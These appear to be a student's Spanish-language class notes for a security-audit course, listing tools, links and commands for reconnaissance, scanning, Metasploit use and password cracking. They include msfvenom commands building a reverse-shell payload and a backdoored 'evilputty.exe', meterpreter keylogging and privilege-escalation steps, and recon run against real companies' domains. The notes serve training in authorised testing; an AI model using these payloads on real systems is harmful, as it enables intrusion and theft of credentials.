---
title: AUDITORIA DE SEGURIDAD INFORMATICA
date: 2021-05-31
---
# MF0487_3: Auditoría de seguridad informática
# 31/05/2021
- [PERFIL_PROFESIONAL](../../libros/modulo_02/01.PERFIL_PROFESIONAL.pdf)
- [FORMACIÓN](../../libros/modulo_02/02.FORMACIÓN.pdf)

## UC0487_3: Auditar redes de comunicación y sistemas informáticos

Juego muy interesante sobre ciberseguridad.
- [Terminal](https://www.ibm.com/security/digital-assets/cybersecurity-ops/terminal/)

Programa para virtualización de sistemas operativos.
- [VirtualBox](https://www.virtualbox.org/)

Distribuciones GNU/Linux para Auditoria de Seguridad.

- [Web Kali](https://www.kali.org/)
- [Web Parrot](https://www.parrotsec.org/)
- [Web Blackarch](https://blackarch.org/index.html)

Como instalar Kali en VirtualBox.
- Instalación: [link](https://www.youtube.com/watch?v=TNFK3JcyjV8).

Manual para realizar pentesting con Kali.
- [Pentesting Kali](../../libros/modulo_02/03.PENTESTING_KALI.pdf).

Búsqueda de información sobre certificaciones oficiales en Ciberseguridad, Hacking, etc.
- [Certificaciones](../../libros/modulo_02/04.CERTIFICACIONES_DE_SEGURIDAD.pdf).

**CEH, GPEN, OSCP y OPST**

- [Certificaciones en ciberseguridad](https://ciberseguridad.blog/7-certificaciones-en-ciberseguridad-que-deberias-tener/)
- [unir - CEH](https://www.unir.net/ingenieria/revista/ceh-certified-ethical-hacker/)
- [Web oficial CEH](https://cert.eccouncil.org/application-process-eligibility.html#ceh)
- [GPEN](https://www.giac.org/certification/penetration-tester-gpen)
- [OSCP](https://www.offensive-security.com/pwk-oscp/?utm_source=adwords&utm_term=oscp&utm_campaign=&utm_medium=ppc&hsa_mt=e&hsa_ad=416958318392&hsa_net=adwords&hsa_src=g&hsa_kw=oscp&hsa_tgt=aud-895380244923:kwd-314572348942&hsa_cam=9267886936&hsa_acc=7794287291&hsa_ver=3&hsa_grp=93957929717&gclid=Cj0KCQjwktKFBhCkARIsAJeDT0jbY4NlV4HYZ1RIr4ls9gElrBsDO2p8_CFxJzWnduJl9Hw9FP3vAk8aAhxFEALw_wcB)

# 01/06/2021

Mirar este video de Aquarius
- [Aquarius](https://www.youtube.com/watch?v=OAUN-DaRLtE)

Manuales en PDF muy interesantes:
- [Manual Blue Team Fiel](../../libros/modulo_02/05.Blue_Team_Field_Manual.pdf)
- [Manual Red Team Fiel](../../libros/modulo_02/06.Red_Team_Field_Manual_v3.pdf)

# 02/06/2021 - Pentesting
## T6. Guías para la ejecución de las distintas fases de la auditoría de sistemas de información
- [Guía de Pentesting](../../libros/modulo_02/09.GUIA_PENTESTING.pdf)
### Primera Fase
- Prezit de profesor: [pentesting](https://prezi.com/view/1LrifrzDQhnooGGEVPoo/).

Buscar información con servicios de terceros ya sea utilizando las siguientes herramientas:
- Buscadores (google, bing, duckduckgo, yahoo, etc)
- Dominios
    - Herramientas: 
        - linux:
            Saber información sobre su TLD: 
            ```
                $ apt install whois
            
                $ whois renfe.es
                $ whois endesa.com
            ```

            Con este programa sabemos sus distintos dominios:
            ```
                $ apt install dnsrecon

                $ dnsrecon -t tld -d endesa
            ```

            Mediante el siguiente comando y un diccionario podemos saber que dominios puede tener:

            Dirección web para sacar todos los dominios: [dnscan](https://github.com/rbsec/dnscan/blob/master/subdomains-1000.txt).
            ```  
                $ apt install dnsmap

                $ dnsmap asinomejubilo.tk -w diccionario_dns.txt

                Comando para generar palabras o diccionarios
                $ apt install crunch
            ```

            Muestra la dirección ip del dominio:
            ```    
                $ apt install host
            
                $ host -t a asinomejubilo.tk
                $ host -t a angel.asinomejubilo.tk
                $ host -t txt asinomejubilo.tk
            ```
           
        - Windows:
            ```
                nslookup
            
                > host -t a asinomejubilo.tk
                > host -t a angel.asinomejubilo.tk
                > host -t txt asinomejubilo.tk
            ```
        - Web: [dominios.es](https://dominios.es/)
        
    - TLD's: https://www.iana.org/domains/root

- Correos - dorking:

    - [TheHarvester](https://github.com/laramies/theHarvester)     
    - [Instalación de TheHaverster en Github](https://github.com/laramies/theHarvester/wiki/Installation)

    
        Nos muestra las cuentas de correos de un dominio asociado:
        ```
            $ theHarvester.py -d renfe.com -l 500 -b linkedin  
        ```
    
    - Buscadores:

        Uso de instrucciones que ofrece los motores de búsqueda (google, bing, duckduckgo, etc)
        ```
            $ "corenetworks.es" -www
            $ ".corenetworks.es" -www
        ```

    - [Web www.exploit-db.com](https://www.exploit-db.com/google-hacking-database)
    - [Web para búsqueda he.net](http://he.net/)

    - Páginas de  búsqueda de empleo, redes sociales, foros, etc.

# 03/06/2021

### Segunda Fase
- [penetration-testing-report-template](../../libros/modulo_02/10.penetration-testing-report-template.pdf)
- [penetration-testing-sample-report](../../libros/modulo_02/11.penetration-testing-sample-report.pdf)
- [OSSAR](../../libros/modulo_02/12.ossar_v0.5.pdf)
- [NII](../../libros/modulo_02/13.NII_Sample_PT_Report.pdf)
- [Pliego Administrativo Técnico](../../libros/modulo_02/14.Pliego_administrativo_técnico.pdf)

Buscar servicios, junto con versiones, puertos, etc de las direcciones IP que se han encontrado.
- Motor de búsqueda para encontrar cosas, ips, etc: [shodan](https://www.shodan.io/)

# 04/06/2021
- Foca: [link](https://www.elevenpaths.com/innovation-labs/technologies/foca).
- Foca: [segundo link](https://github.com/ElevenPaths/FOCA).
- Foca: [archivo](../../libros/modulo_02/15.FocaPro.zip)

Cuando lanzamos nmap comprobamos que puertos estan abierto (en verde) y cerrados.
- Curso nmap: [github](https://github.com/Y000o/Nmap).

```
    $ nmap -O -F goldengate.tk
    $ nmap -T4 -A -v goldengate.tk
```
Y utilizamos aplicaciones y herramientas como navegador web, filezilla, ssh, etc.

Mirar este documental: [Hackeame si puedes](https://www.youtube.com/watch?v=zewkqnInHVY).

# 07/06/2021
Instalación de la herramienta de Nessus, para auditoria, informes sobre nuestra red o dominio.
- Descargar Nessus: [Nessus](https://www.tenable.com/downloads/nessus?loginAttempted=true)
- Descargar máquina virtual de Ubuntu: [ubuntu ftp](ftp://goldengate.tk)
- Ruta de scripts: https://nmap.org/nsedoc/

# 08/06/2021
Página para código malicioso: https://www.sub7crew.org/
**Punto 6. Aplicaciones Web**
**DVWA** es una web que sirve como banco de pruebas para realizar pruebas de pentesting:

- Instalación de entorno DVWA [Manual](../../libros/modulo_02/16.PFM_DVWA.pdf)
- Página de DVWA: [web oficial para la descarga](https://dvwa.co.uk/).
- Video guia [Instalación de DVWA](https://www.youtube.com/watch?v=PaB17Cc0dUg).

Guía instalación en debian:
- Descargar el archivo desde la página oficial [link de descarga](https://dvwa.co.uk/).
- Subirlo por ftp o copiar mediante wget.
- Copiarlo a la ruta /var/www/html.
- Renombra la carpeta.
- Renombrar el archivo **config.inc.php.dist** por **config.inc.php**.
- Crear un usuario y contraseña en la base de datos ya sea por consola o por phpmyadmin.
- Actualizar **config.inc.php** por el usurio y contraseña creado.
- Abrir un navegador web e insertar la dirección ip `http://ip/dvwa`.
- Aparecera la página de instalación de DVWA, clicamos en crear `database`.
- Luego nos aparecera la página de login de DVWA: `usuario: admin, contraseña: password`.

Manual/guía de vulnerabilidades que puede ser interesante:
- Ataque de vulnerabilidades [DVWA](../../libros/modulo_02/16.PFM_DVWA.pdf)

# 09/06/2021
Ataque por inyección sql utilizando DVWA.

```
version()
database()
current_user()
user()
last_insert_id()
@@datadir
```

Instalación de John The Ripper para descrifar contraseñas:
```
$ apt install john
```
# 10/06/2021
- Página [OWASP](https://owasp.org/www-project-top-ten/)
- Guía [OWASP](../../libros/modulo_02/17.OWASP_Top_10_-_2013_Final.pdf)
- Recopilación [Web](https://www.hackplayers.com/2015/07/recopilatorio-de-aplicaciones-y.html)

# 14/06/2021
- Guía rápida [link](https://cheatsheet.haax.fr/)

**Punto 4. Explotación**

Fase en la que se comprueban y explotan vulnerabilidades:

**Fuzzing**

Sitio Web de Google para practicar ciberseguridad: [link](https://google-gruyere.appspot.com/).

Página web de metasploit muy interesante: [link](https://metasploit.com/).

# 15/06/2021
Kali metasploit:
```
$ msfconsole > iniciamos la aplicación

$ help > todos los comandos

$ db_status > en que base de datos estamos

$ workspace
$ workspace -h
$ workspace -a corenetworks

$ hosts
$ creds
$ notes
$ vulns
$ loot

$ search -h

$ search name:arp_sweep

$ use ruta

$ show options
$ info

$ set rhost ip/24
$ run

$ search name:udp_sweep

$ hosts -R // consulta la bbdd y los envia a un archivo.

$ services

$ search name:portscan

$ use ruta

$ db_import scan.xml // importar un archivo de nmap

$ db_nmap ip // algo básico

$ apt install openvas
$ openvas_connect root toor 127.0.0.1 9390
$ openvas_target_list
$ openvas_target_create demo-wb 10.2.2.3 webinario
$ openvas_task_list
$ openvas_config_list
$ openvas_task_create demo-wb task config_id targe_id
$ openvas_task_start id_task
$ openvas_task_list //mirar status para si se ejecuta y ha terminado.
$ openvas-report_list
```
Aquí buscaremos alguna vulnerabilidad si el escaneo no muestra nada.
- [Exploid db](https://www.exploit-db.com/)
```
$ search -h
$ search cve:2015-8249
$ use exploit/..../nombre_exploit
$ set payload windows/meterpreter/reverse_tcp
$ check
$ run -z // lanza el comando pero pone en background
$ session -l
$ sessions -v
$ sessions -i 1
//dentro de meterpreter
$ screenshot
$ getuid
$ getsystem
$ ps
$ arp
$ background //vuelve atras

$ search name:migrate
$ use post/.../nombre_payload
$ migrate

$ route add ip mascara session
$ route
$ use .../ar_sweep
$ db_nmap -sS -p1-10000 ip

```
Descargar [Metasploitable](https://sourceforge.net/projects/metasploitable/)

# 16/06/2021
Hoy utilizamos una serie de herramientas que son:

```
$ msfvenom

$ /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.30 LPORT=567 -f exe -o malo.exe

$ use exploit/multi/handler

$ set payload windows/meterpreter/reverse_tcp

$ set lhost ip_server

$ set rport puerto_escucha

$ run

$ meterpreter

$ keyscan_start

$ keyscan_dump
```
Backdoors

- bajar ejecutable
- comprobar md5 tanto por la página como por linux terminal.

```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.30 LPORT=567 -x putty.exe -f exe -o evilputty.exe 
```

Video interesante: [deloite](https://www.youtube.com/watch?v=7UPe_fxOz8M).

Página muy interesante: [hackthebox](https://www.hackthebox.eu/).

Colección de sitios para realizar pruebas de vulnerabilidades: [CTFSITES](https://ctfsites.github.io/).

Máquinas virtuales para realizar testeos de ciberseguridad: [Vulnhub](https://www.vulnhub.com/).

Recopilatorio de aplicaciones y sistemas vulnerables para practicar: [hackplayers](https://www.hackplayers.com/2015/07/recopilatorio-de-aplicaciones-y.html).



# 17/06/2021
Libro guia de como montar y utilizar metasploit: [GUIA METASPLOIT](../../libros/modulo_02/18.THE-EASIEST-METASPLOIT-GUIDE.pdf)

Video de adivinar tu vida através de las redes sociales: [link](https://www.youtube.com/watch?v=j-tFoYNHi1w).

Video del El País niños redes sociales: [link](https://www.youtube.com/watch?v=WqBl2zyXI7g).

- Romper contraseñas mediante diccionarios.

```
$ crunch 4 4 0123456789
```

- Keylogers: para conocer contraseñas de servicios.

- En kali utilizamos xHydra.

- Johnny (Kali): para descrifrar contraseña con hash.

```
$ sudo apt-get install johnny
```

Guía libro de mucha ayuda para romper hash: [HASH CRACK PASSWORD](../../libros/modulo_02/19.Hash-Crack-Password-Cracking-Manual-v3.pdf).

# 21/06/2021
## T3. Análisis de riesgos de los sistemas de información
- Análisis de riesgos de los sistemas de información: [doc pdf](../../libros/modulo_02/20.T3.Análisis-de-riesgos-de-los-sistemas-de-información.pdf).
- OWASP Top 10 2013: [doc pdf](../../libros/modulo_02/23.OWASP_Top_10_-_2013_Final_-_Español.pdf).
- Realizar el test.
## T1. Criterios generales comúnmente aceptados sobre auditoría informática
- Criterios aceptados en Auditoria: [doc pdf](../../libros/modulo_02/21.T1.Criterios-aceptados-en-Auditoría-Informática.pdf).
- Hoja ejemplo: [ISCA Code of Ethics](../../libros/modulo_02/22.ISACA-Code-of-Ethics-Spanish.pdf).

## T5. Descripción de los aspectos sobre cortafuegos en auditorías de Sistemas Informáticos
- Documento: [Descripción de los aspectos sobre cortafuegos](../../libros/modulo_02/24.T5.-Descripción-de-los-aspectos-sobre-cortafuegos.pdf).
- Documento: [Presentación Waterfall](../../libros/modulo_02/25.Presentación-Waterfall.pdf).

# 22/06/2021
https://github.com/s4vitar/evilTrust

https://github.com/elcaza/get_off_my_wifi

https://protegermipc.net/2020/05/27/descifrar-trafico-ssl-con-wireshark/

## T4. Uso de herramientas para la auditoría de sistemas

- [Usos de herramientas para la auditoría de sistemas Archivo](../../libros/modulo_02/26.T4.-Usos-de-herramientas-para-la-auditoría-de-sistemas.pdf).
- [Tracerouter visual online](https://gsuite.tools/traceroute).
- Open virtual trace route `programa`.

```
> netstat -pbtona tcp 60
```
- [Rango de ip que no se deberían escanear](../../libros/modulo_02/27.NOT_SCAN.txt).
- [Pentesting con Burp Suite](../../libros/modulo_02/28.burp_preso.pdf).
- [Burp Suite Tutorial](https://vimeo.com/11553558).
- [Libro Handbook](https://www.amazon.es/The-Web-Application-Hackers-Handbook/dp/1118026470).
- [Foro BurpSuiteURL](https://forum.portswigger.net/).
- [World Wide Web Technology Surveys](https://w3techs.com/).

```
https://www.arachni-scanner.com/download/
instalar esto en kali

$ httrack dirección web

$ wget --wait=20 --limit-rate=20k -r -p -U Mozilla web
```
# 24/06/2021

Video de la sexta: [link video](https://www.lasexta.com/programas/salvados/noticias/existen-presiones-politicas-que-van-desprestigiar-juez_201305125727868c4beb28d44602f38f.html)

# 25/06/2021

- Examen preguntas a desarrollar y preguntas tipo test.
- Herramienta con Nessus.
- Preguntas tipo test no restan.
- Preguntas para sacar nota.
- Puntos: 10.

# 26/06/2021
## Examen - Auditoría de seguridad informática

- [Nessus](../../libros/modulo_02/29.examen_wlhfml.nessus)
- [Examen](../../libros/modulo_02/30.EXAMEN_AUDITORIA.docx)


# 28/06/2021

- Trasteando






